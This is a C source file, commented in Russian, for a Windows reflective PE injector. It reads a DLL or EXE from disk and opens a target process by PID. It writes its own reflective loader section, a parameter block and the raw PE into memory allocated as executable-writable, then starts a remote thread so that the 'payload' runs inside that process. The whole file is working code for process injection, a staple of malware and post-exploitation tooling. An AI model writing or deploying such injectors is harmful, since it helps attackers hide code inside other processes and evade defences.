// Инжектор: читает PE с диска, открывает целевой процесс по PID,
// копирует туда код рефлективного загрузчика и сырые байты PE,
// запускает удалённый поток на точке входа загрузчика.

#include <windows.h>
#include <stdio.h>
#include "loader.h"

static int print_err(const char *msg)
{
    DWORD e = GetLastError();
    fprintf(stderr, "[-] %s (GetLastError=%lu)\n", msg, e);
    return 1;
}

// Считать файл целиком в кучу
static BYTE *read_file(const char *path, DWORD *out_size)
{
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(h, NULL);
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, size);
    if (!buf) { CloseHandle(h); return NULL; }

    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(h);
        return NULL;
    }
    CloseHandle(h);
    *out_size = size;
    return buf;
}

// Определение типа PE: IMAGE_FILE_DLL → DLL, иначе EXE
static int is_dll(BYTE *raw)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)raw;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
    return (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
}

// Найти в собственном PE секцию по имени.
// Возвращает указатель на её начало в памяти и размер.
static BYTE *find_own_section(const char *name, SIZE_T *out_size)
{
    HMODULE self = GetModuleHandleA(NULL);
    BYTE *base = (BYTE *)self;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        // Имя секции - 8 байт, может быть без нуль-терминатора
        char sname[9];
        for (int j = 0; j < 8; j++) sname[j] = (char)sec[i].Name[j];
        sname[8] = 0;
        if (strncmp(sname, name, 8) == 0) {
            *out_size = sec[i].Misc.VirtualSize;
            return base + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("Usage: %s <PID> <path-to-pe>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    const char *pe_path = argv[2];

    // 1. Читаем целевой PE
    DWORD pe_size = 0;
    BYTE *pe_raw = read_file(pe_path, &pe_size);
    if (!pe_raw) return print_err("ReadFile (target PE)");
    printf("[+] Loaded PE: %s (%lu bytes)\n", pe_path, pe_size);

    int dll_mode = is_dll(pe_raw);
    printf("[+] Type: %s\n", dll_mode ? "DLL" : "EXE");

    // 2. Берём всю секцию .rldr из собственного PE — она содержит ReflectiveLoader
    // вместе со всеми хелперами (rl_memset, find_module_by_name и т.д.).
    // Адрес ReflectiveLoader внутри секции — это offset, по которому мы потом
    // войдём в чужой памяти.
    SIZE_T loader_size = 0;
    BYTE *loader_section = find_own_section(".rldr", &loader_size);
    if (!loader_section || !loader_size) {
        fprintf(stderr, "[-] .rldr section not found in own PE\n");
        return 1;
    }
    SIZE_T entry_offset = (SIZE_T)((BYTE *)ReflectiveLoader - loader_section);
    if (entry_offset >= loader_size) {
        fprintf(stderr, "[-] ReflectiveLoader not inside .rldr section (off=%llu, sz=%llu)\n",
                (unsigned long long)entry_offset, (unsigned long long)loader_size);
        return 1;
    }
    printf("[+] .rldr section: %llu bytes, ReflectiveLoader offset: %llu\n",
           (unsigned long long)loader_size, (unsigned long long)entry_offset);

    // 3. Открываем целевой процесс
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) return print_err("OpenProcess");
    printf("[+] Opened PID %lu\n", pid);

    // 4. Аллоцируем в целевом процессе три региона:
    //    [loader code] [LOADER_PARAM] [raw PE bytes]
    SIZE_T param_size = sizeof(LOADER_PARAM);
    SIZE_T total_size = loader_size + param_size + pe_size;

    BYTE *remote_block = (BYTE *)VirtualAllocEx(
        hProc, NULL, total_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remote_block) return print_err("VirtualAllocEx");
    printf("[+] Allocated remote block at %p\n", remote_block);

    BYTE *remote_section = remote_block;
    BYTE *remote_loader  = remote_section + entry_offset;  // точка входа
    BYTE *remote_param   = remote_section + loader_size;
    BYTE *remote_pe      = remote_param + param_size;

    // 5. Записываем всю секцию .rldr
    if (!WriteProcessMemory(hProc, remote_section, loader_section,
                            loader_size, NULL))
        return print_err("WriteProcessMemory (loader)");

    // 6. Записываем сырые байты PE
    if (!WriteProcessMemory(hProc, remote_pe, pe_raw, pe_size, NULL))
        return print_err("WriteProcessMemory (PE)");

    // 7. Готовим параметр и пишем его
    LOADER_PARAM lp;
    lp.raw_pe              = remote_pe;
    lp.raw_pe_size         = pe_size;
    lp.flags               = dll_mode ? 0 : 1;
    lp.out_module_base     = NULL;
    lp.loader_section      = remote_section;
    lp.loader_section_size = (DWORD)loader_size;
    lp.entry_offset        = (DWORD)entry_offset;

    if (!WriteProcessMemory(hProc, remote_param, &lp, sizeof(lp), NULL))
        return print_err("WriteProcessMemory (param)");

    // 8. Запускаем удалённый поток на точке входа загрузчика
    DWORD tid = 0;
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_loader,
        remote_param, 0, &tid);
    if (!hThread) return print_err("CreateRemoteThread");
    printf("[+] Remote thread TID=%lu started at %p (section base %p)\n",
           tid, remote_loader, remote_section);

    // 9. Короткая проверка: ждём 1 секунду.
    // Для EXE-payload это нормально, что поток не возвращается — entry point
    // вошёл в свой основной цикл. Если поток жив через секунду и не упал,
    // считаем загрузку успешной.
    DWORD wait_status = WaitForSingleObject(hThread, 1000);
    DWORD code = 0;
    GetExitCodeThread(hThread, &code);

    LOADER_PARAM result;
    ReadProcessMemory(hProc, remote_param, &result, sizeof(result), NULL);
    uintptr_t v = (uintptr_t)result.out_module_base;

    if (wait_status == WAIT_TIMEOUT) {
        // Поток ещё работает — для EXE это и есть успех
        printf("[+] Remote thread still running — payload entry point active\n");
        if (v >= 0x10000)
            printf("[+] Mapped module base in target: %p\n", (void *)v);
        else
            printf("[*] Last STEP=%llu (entry point not yet reached)\n",
                   (unsigned long long)v);
    } else {
        // Завершился сам
        printf("[+] Loader thread exited: code=%lu (0x%08lX)\n", code, code);
        if (v < 0x10000)
            printf("[!] Last STEP=%llu (loader did not complete)\n",
                   (unsigned long long)v);
        else
            printf("[+] Mapped module base in target: %p\n", (void *)v);
    }

    // Освобождать remote_block не обязательно — модуль может его использовать.
    // Если нужно — раскомментировать:
    // VirtualFreeEx(hProc, remote_block, 0, MEM_RELEASE);

    CloseHandle(hThread);
    CloseHandle(hProc);
    HeapFree(GetProcessHeap(), 0, pe_raw);
    return 0;
}
